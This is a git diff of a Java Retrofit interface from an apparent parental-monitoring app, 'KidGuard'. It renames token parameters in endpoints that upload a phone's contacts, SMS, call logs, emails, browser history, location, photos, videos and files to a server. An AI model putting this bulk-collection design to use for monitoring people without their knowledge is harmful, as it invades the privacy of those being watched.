@@ -1,6 +1,7 @@
 package com.kidguard.interfaces;
 
 
+import com.kidguard.pojo.ApiResponsePOJO;
 import com.kidguard.pojo.AppPOJO;
 import com.kidguard.pojo.BrowserHistoryPOJO;
 import com.kidguard.pojo.CallPOJO;
@@ -41,55 +42,57 @@ public interface RestClient {
                                  @Field("device_registration_id") String device_registration_id,
                                  @Field("device_mac_address") String mac_address);
 
-    @FormUrlEncoded
-    @POST("./")
-    Call<ContactPOJO> sendContactsToServer(@Field("access_token") String token, @Field("data") String data);
+    //api_token
 
     @FormUrlEncoded
     @POST("./")
-    Call<SmsPOJO> sendSmsToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<ApiResponsePOJO> sendContactsToServer(@Field("access_token") String token, @Field("data") String data);
 
     @FormUrlEncoded
     @POST("./")
-    Call<CallPOJO> sendCallsToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<ApiResponsePOJO> sendSmsToServer(@Field("access_token") String token, @Field("data") String data);
 
     @FormUrlEncoded
     @POST("./")
-    Call<AppPOJO> sendAppsToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<CallPOJO> sendCallsToServer(@Field("access_token") String token, @Field("data") String data);
 
     @FormUrlEncoded
     @POST("./")
-    Call<EmailPOJO> sendEmailsToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<AppPOJO> sendAppsToServer(@Field("access_token") String token, @Field("data") String data);
 
     @FormUrlEncoded
     @POST("./")
-    Call<BrowserHistoryPOJO> sendBrowserHistoryToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<EmailPOJO> sendEmailsToServer(@Field("access_token") String token, @Field("data") String data);
 
     @FormUrlEncoded
     @POST("./")
-    Call<LocationPOJO> sendLocationToServer(@Field("api_token") String token, @Field("data") String data);
+    Call<BrowserHistoryPOJO> sendBrowserHistoryToServer(@Field("access_token") String token, @Field("data") String data);
+
+    @FormUrlEncoded
+    @POST("./")
+    Call<LocationPOJO> sendLocationToServer(@Field("access_token") String token, @Field("data") String data);
 
     @Multipart
     @POST("./")
-    Call<ImagePOJO> sendImageToServer(@Query("api_token") String token,
+    Call<ImagePOJO> sendImageToServer(@Query("access_token") String token,
                                       @PartMap() HashMap<String, RequestBody> map,
                                       @Part MultipartBody.Part file);
 
     @Multipart
     @POST("./")
-    Call<VideoPOJO> sendVideoToServer(@Query("api_token") String token,
+    Call<VideoPOJO> sendVideoToServer(@Query("access_token") String token,
                                       @PartMap() HashMap<String, RequestBody> map,
                                       @Part MultipartBody.Part file);
 
     @Multipart
     @POST("./")
-    Call<FilePOJO> sendFilesToServer(@Query("api_token") String token,
+    Call<FilePOJO> sendFilesToServer(@Query("access_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);
 
     @Multipart
     @POST("./")
-    Call<DrivePOJO> sendDriveToServer(@Query("api_token") String token,
+    Call<DrivePOJO> sendDriveToServer(@Query("access_token") String token,
                                       @PartMap() HashMap<String, RequestBody> map,
                                       @Part MultipartBody.Part file);
 
